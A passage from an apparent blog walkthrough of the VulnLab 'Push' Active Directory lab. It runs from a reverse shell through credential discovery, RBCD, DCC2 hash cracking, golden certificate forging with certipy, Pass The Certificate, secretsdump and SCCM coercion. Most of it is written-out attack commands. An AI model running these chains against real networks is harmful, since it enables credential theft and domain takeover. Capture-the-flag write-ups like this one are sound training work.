<p>After uploading all modified files and waiting a short period (ensure your listening port matches and your HTTP server is serving nc64.exe), we receive a shell:</p>
<p><img src="/images/Push/getting-shell.png" alt="Shell obtained"></p>
<h3 id="Discovering-Additional-Credentials"><a href="#Discovering-Additional-Credentials" class="headerlink" title="Discovering Additional Credentials"></a>Discovering Additional Credentials</h3><p>We find Kelly Hill’s credentials in a <code>.git-credentials</code> file:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\kelly.hill&gt;type .git-credentials</span><br><span class="line">type .git-credentials</span><br><span class="line">https://kelly.hill:&lt;PASS&gt;@github.com</span><br></pre></td></tr></table></figure>

<p>As you can see, the intended path is significantly more challenging than the NTLM relay approach, but it’s valuable to understand both attack vectors!</p>
<h2 id="Privilege-Escalation-Path"><a href="#Privilege-Escalation-Path" class="headerlink" title="Privilege Escalation Path"></a>Privilege Escalation Path</h2><p>We need to obtain access to either <code>sccadmin</code> or achieve local administrator privileges on MS01.</p>
<p><img src="/images/Push/rbcd-path.png" alt="RBCD attack path"></p>
<h3 id="Resource-Based-Constrained-Delegation-RBCD"><a href="#Resource-Based-Constrained-Delegation-RBCD" class="headerlink" title="Resource-Based Constrained Delegation (RBCD)"></a>Resource-Based Constrained Delegation (RBCD)</h3><p>One alternative path is through RBCD. Since we have the ability to add up to 10 machines to the domain, we can leverage this for privilege escalation. Here are the base commands we would use if we hadn’t obtained local administrator access through the NTLM relay:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">addcomputer.py -method LDAPS -computer-name &#x27;ATTACKERSYSTEM$&#x27; -computer-pass &#x27;Summer2018!&#x27; -dc-host $DomainController -domain-netbios $DOMAIN &#x27;domain/user:password&#x27;</span><br><span class="line"></span><br><span class="line">rbcd.py -delegate-from &#x27;ATTACKERSYSTEM$&#x27; -delegate-to &#x27;TargetComputer&#x27; -action &#x27;write&#x27; &#x27;domain/user:password&#x27;</span><br><span class="line"></span><br><span class="line">getST.py -spn &#x27;cifs/targetcomputer.testlab.local&#x27; -impersonate &#x27;administrator&#x27; &#x27;domain/attackersystem$:Summer2018!&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="Obtaining-sccadmin-Credentials"><a href="#Obtaining-sccadmin-Credentials" class="headerlink" title="Obtaining sccadmin Credentials"></a>Obtaining sccadmin Credentials</h2><p>Now that we have local administrator access on the machine (either through NTLM relay or RBCD), we can dump the LSA secrets and extract the DCC2 hash for <code>sccadmin</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat hash /usr/share/wordlists/rockyou.txt -m 2100</span><br></pre></td></tr></table></figure>

<p>The hash cracks successfully:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sccadmin:&lt;PASS&gt;</span><br></pre></td></tr></table></figure>

<p>The <code>sccadmin</code> user has administrator privileges on MS01. Additionally, after investigating the Certificate Authority (CA), we discover that MS01 has administrative access to the CA server.</p>
<h2 id="Golden-Certificate-Attack"><a href="#Golden-Certificate-Attack" class="headerlink" title="Golden Certificate Attack"></a>Golden Certificate Attack</h2><p>We can use either the <code>sccadmin</code> credentials or the local administrator hash to create a Golden Certificate.</p>
<h3 id="Backing-Up-CA-Keys"><a href="#Backing-Up-CA-Keys" class="headerlink" title="Backing Up CA Keys"></a>Backing Up CA Keys</h3><p>Back up the CA keys to our attacking machine:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">certipy ca -u sccadmin -p &#x27;&lt;PASS&gt;&#x27; -target-ip MS01.push.vl -backup</span><br><span class="line"></span><br><span class="line">OR</span><br><span class="line"></span><br><span class="line">certipy ca -u administrator -hashes &lt;HASH&gt; -target-ip MS01.push.vl -backup</span><br></pre></td></tr></table></figure>

<h3 id="Forging-the-Certificate"><a href="#Forging-the-Certificate" class="headerlink" title="Forging the Certificate"></a>Forging the Certificate</h3><p>Attempt to forge a certificate for the domain administrator:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy forge -ca-pfx CA.pfx -upn administrator@push.vl -subject &#x27;CN=Administrator,CN=Users,DC=PUSH,DC=VL</span><br></pre></td></tr></table></figure>

<p>However, we encounter an error:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KDC_ERROR_CLIENT_NOT_TRUSTED(Reserved for PKINIT)</span><br></pre></td></tr></table></figure>

<h3 id="Pass-The-Certificate-Technique"><a href="#Pass-The-Certificate-Technique" class="headerlink" title="Pass The Certificate Technique"></a>Pass The Certificate Technique</h3><p>To bypass this restriction, we can use the Pass The Certificate technique on the kelly.hill user account that we compromised earlier.</p>
<p>Required tools:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/AlmondOffSec/PassTheCert/blob/main/Python/passthecert.py">https://github.com/AlmondOffSec/PassTheCert/blob/main/Python/passthecert.py</a></li>
</ul>
<p>Reference blog post:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate">https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate</a></li>
</ul>
<h3 id="Complete-Attack-Chain"><a href="#Complete-Attack-Chain" class="headerlink" title="Complete Attack Chain"></a>Complete Attack Chain</h3><p>Execute the following steps to complete the Pass The Certificate attack:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">certipy forge -ca-pfx CA.pfx -upn administrator@push.vl -subject &#x27;CN=Administrator,CN=Users,DC=PUSH,DC=VL&#x27; -sid &#x27;S-1-5-21-1451457175-172047642-1427519037-500&#x27;</span><br><span class="line"></span><br><span class="line">certipy cert -pfx &quot;administrator_forged.pfx&quot; -nokey -out &quot;user.crt&quot;</span><br><span class="line">certipy cert -pfx &quot;administrator_forged.pfx&quot; -nocert -out &quot;user.key&quot;</span><br><span class="line"></span><br><span class="line">python3 passthecert.py -action modify_user -crt user.crt  -key user.key  -target kelly.hill -elevate -domain push.vl -dc-host dc01.push.vl</span><br></pre></td></tr></table></figure>

<h3 id="Domain-Compromise"><a href="#Domain-Compromise" class="headerlink" title="Domain Compromise"></a>Domain Compromise</h3><p>Finally, we can dump all domain secrets:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py kelly.hill@dc01.push.vl</span><br></pre></td></tr></table></figure>

<p><img src="/images/Push/Secrets-dump.png" alt="Domain secrets dumped"></p>
<p>And obtain full domain administrator access:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i dc01.push.vl  -u administrator -H &lt;HASH&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Alternative-Path-Coercing-SCCM-Authentication"><a href="#Alternative-Path-Coercing-SCCM-Authentication" class="headerlink" title="Alternative Path - Coercing SCCM Authentication"></a>Alternative Path - Coercing SCCM Authentication</h2><p>There’s another method to obtain the <code>sccadmin</code> credentials through SCCM coercion.</p>
<p>Reference: <a target="_blank" rel="noopener" href="https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a">https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a</a></p>
<p>Start Responder to capture the authentication:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I tun0</span><br></pre></td></tr></table></figure>

<p>Execute the SCCM client push coercion:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\SharpSCCM.exe invoke client-push -t 10.8.5.195 -mp DC01.push.vl -sc HQ0</span><br></pre></td></tr></table></figure>

<p>This captures an NTLMv2 hash for sccadmin that can be cracked offline. Note: This attack may require multiple attempts to succeed (it took 3 restarts in my testing).</p>
<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>This VulnLab Push chain&#x2F;ProLab demonstrates multiple attack paths commonly found in real-world Active Directory environments, including:</p>
<ul>
<li>Anonymous FTP enumeration</li>
<li>NTLM relay attacks exploiting unsigned SMB</li>
<li>ClickOnce application backdooring</li>
<li>Resource-Based Constrained Delegation (RBCD)</li>
<li>Active Directory Certificate Services exploitation</li>
<li>Pass The Certificate techniques</li>
<li>SCCM coercion attacks</li>
</ul>
<p>Understanding these diverse attack vectors is crucial for both offensive security professionals and defenders securing Active Directory environments.</p>
<hr>
<p><strong>Badge Link:</strong> <a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=c061f850-c9cd-42ba-aff1-0ff54838a49f">https://api.vulnlab.com/api/v1/share?id=c061f850-c9cd-42ba-aff1-0ff54838a49f</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writeups</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Push-VulnLab-Walkthrough-Writeup-Active-Directory-Chain-ProLab-Penetration-Testing"><span class="toc-number">1.</span> <span class="toc-text">Push VulnLab Walkthrough &amp; Writeup - Active Directory Chain &#x2F; ProLab Penetration Testing</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Network-Information"><span class="toc-number">1.1.</span> <span class="toc-text">Network Information</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-DC01-push-vl"><span class="toc-number">1.2.1.</span> <span class="toc-text">Nmap Scan - DC01.push.vl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-MS01-push-vl"><span class="toc-number">1.2.2.</span> <span class="toc-text">Nmap Scan - MS01.push.vl</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access-via-FTP"><span class="toc-number">1.3.</span> <span class="toc-text">Initial Access via FTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unintended-Path-NTLM-Relay-Attack"><span class="toc-number">1.4.</span> <span class="toc-text">Unintended Path - NTLM Relay Attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Intended-Path-ClickOnce-Application-Exploitation"><span class="toc-number">1.5.</span> <span class="toc-text">Intended Path - ClickOnce Application Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumerating-Share-Access"><span class="toc-number">1.5.1.</span> <span class="toc-text">Enumerating Share Access</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Creating-the-Malicious-DLL"><span class="toc-number">1.5.2.</span> <span class="toc-text">Creating the Malicious DLL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Modifying-the-Manifest-Files"><span class="toc-number">1.5.3.</span> <span class="toc-text">Modifying the Manifest Files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Discovering-Additional-Credentials"><span class="toc-number">1.5.4.</span> <span class="toc-text">Discovering Additional Credentials</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-Path"><span class="toc-number">1.6.</span> <span class="toc-text">Privilege Escalation Path</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Resource-Based-Constrained-Delegation-RBCD"><span class="toc-number">1.6.1.</span> <span class="toc-text">Resource-Based Constrained Delegation (RBCD)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Obtaining-sccadmin-Credentials"><span class="toc-number">1.7.</span> <span class="toc-text">Obtaining sccadmin Credentials</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Golden-Certificate-Attack"><span class="toc-number">1.8.</span> <span class="toc-text">Golden Certificate Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Backing-Up-CA-Keys"><span class="toc-number">1.8.1.</span> <span class="toc-text">Backing Up CA Keys</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Forging-the-Certificate"><span class="toc-number">1.8.2.</span> <span class="toc-text">Forging the Certificate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-The-Certificate-Technique"><span class="toc-number">1.8.3.</span> <span class="toc-text">Pass The Certificate Technique</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Complete-Attack-Chain"><span class="toc-number">1.8.4.</span> <span class="toc-text">Complete Attack Chain</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Domain-Compromise"><span class="toc-number">1.8.5.</span> <span class="toc-text">Domain Compromise</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Alternative-Path-Coercing-SCCM-Authentication"><span class="toc-number">1.9.</span> <span class="toc-text">Alternative Path - Coercing SCCM Authentication</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.10.</span> <span class="toc-text">Conclusion</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/11/23/VL-Push/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/11/23/VL-Push/&text=VL-Push"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/11/23/VL-Push/&title=VL-Push"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/11/23/VL-Push/&is_video=false&description=VL-Push"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=VL-Push&body=Check out this article: https://panosoikogr.github.io/2025/11/23/VL-Push/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/11/23/VL-Push/&title=VL-Push"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/11/23/VL-Push/&title=VL-Push"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/11/23/VL-Push/&title=VL-Push"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/11/23/VL-Push/&title=VL-Push"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/11/23/VL-Push/&name=VL-Push&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/11/23/VL-Push/&t=VL-Push"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024-2027
    Panosoiko
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writeups</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->


<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="panosoikogr" data-description="Support me on Buy me a coffee!" data-message="Thanks for stopping by! If you’d like to support my work, feel free to treat me to a coffee." data-color="#40DCA5" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

</body>
</html>
